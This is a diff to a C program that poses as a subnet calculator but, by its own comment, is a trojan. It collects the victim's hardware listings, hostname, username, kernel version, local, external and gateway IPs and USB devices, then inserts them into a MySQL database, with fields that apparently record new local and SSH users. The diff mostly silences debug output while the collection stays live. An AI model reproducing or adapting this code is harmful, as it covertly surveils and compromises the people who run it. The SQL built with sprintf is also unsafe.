@@ -23,14 +23,14 @@ int conceptretrieve(){
 	FILE * proc;
 	int c;
 	c = getifaddrs(&ip);
-	printf("Network address %s : - %d\n",ip->ifa_name,ip->ifa_addr);
+	//printf("Network address %s : - %d\n",ip->ifa_name,ip->ifa_addr);
 	proc = fopen("/proc/cpuinfo","r");
 	while(1){
 		c = fgetc(proc);
 		if( feof(proc) ){
 			break;
 		}	
-		printf("%c",c);
+		//printf("%c",c);
 	}
 	fclose(proc);
 
@@ -161,7 +161,6 @@ void calculatorInterface() /* GTK is a bit of a nightmare; CLI UIs all the way, 
 	{
 		printf("Please input the host address: ");
 		scanf("%s", choice1);
-		printf();
 		breakHost(choice1); //Break up the IP into four integers, one per octet
 		if(hostOctets[0] < 1 || hostOctets[1] < 0 || hostOctets[2] < 0 || hostOctets[3] < 1 || hostOctets[0] > 254 || hostOctets[1] > 255 || hostOctets[2] > 255 || hostOctets[3] > 254)
 		{
@@ -177,7 +176,6 @@ void calculatorInterface() /* GTK is a bit of a nightmare; CLI UIs all the way, 
 	{
 		printf("Please input the network class: ");
 		scanf("%c", choice2);
-		printf();
 		if(choice2 == 'A' || choice2 == 'a' || choice2 == 'B' || choice2 == 'b' || choice2 == 'C' || choice2 == 'c')
 		{
 			netClass = choice2;
@@ -193,7 +191,6 @@ void calculatorInterface() /* GTK is a bit of a nightmare; CLI UIs all the way, 
 	{
 		printf("Please input the subnet mask: ");
 		scanf("%s", choice3);
-		printf();
 		breakMask(choice3); //Break up the IP into four integers, one per octet
 		if(maskOctets[0] == 0 || maskOctets[0] == 128 || maskOctets[0] == 192 || maskOctets[0] == 224 || maskOctets[0] == 240 || maskOctets[0] == 248 || maskOctets[0] == 252 || maskOctets[0] == 255)
 		{
@@ -284,12 +281,13 @@ int subnetCalculator(){ // Not fully implemented -- just conceptual -- Will like
 }
 
 
+//MAIN FUNCTION~~~~~~~~~~~~~~
 int main()
 {
 //Defining Device Extraction variables.  Accounted for End-of-String character.  Char length matches max length defined in the database
-	char UUID[51] = "8284246F-05X13-1945-90DD-DD6D00E95954";
+	char UUID[51] = "8284246F-STUPID-1945-90DD-DD6D00E95954";
 	char lshw[13001] = "";
-	popenretrieve(lshw, "lshw", sizeof(lshw));
+	//popenretrieve(lshw, "lshw", sizeof(lshw));
 	//printf("%s",lshw);	
 	char lscpu[1601] = "";
 	popenretrieve(lscpu, "lscpu", sizeof(lscpu));
@@ -374,24 +372,24 @@ int main()
 	//If this is the first time this PC ran this trojan, log Device info
 	if (duplicate == 0)
 	{
-		//Creating the prepaired statement
+		//Creating the prepaired statement		
 		sprintf(prepairedStatement, "INSERT INTO Device VALUES ('%s','%s','%s','%s','%s')", UUID, lshw, lscpu, lsblk, datetime);
 		//printf("%s", prepairedStatement);
 		
 		//Runs the INSERT query to Device Table
 		if(mysql_query(conn, prepairedStatement) != 0)
 		{
-			printf("Query Failed.  Error: %s\n", mysql_error(conn));
+			printf("Device INSERT Failed.  Error: %s\n", mysql_error(conn));
 		}
 	}
 	
-	//RunLog INSERT
+	//RunLog INSERT	
 	sprintf(prepairedStatement, "INSERT INTO RunLog VALUES (0,'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", UUID,KernelVer,Hostname,Username,KernelRelease,TimeRun,lsusb,LocalIP,ExternalIP,GatewayIP,NewLocalUser,SSHserver,NewSSHuser);
 
 	//Runs the INSERT query to RunLog Table
 	if(mysql_query(conn, prepairedStatement) != 0)
 	{
-		printf("Query Failed.  Error: %s\n", mysql_error(conn));
+		printf("RunLog INSERT Failed.  Error: %s\n", mysql_error(conn));
 	}
 
 
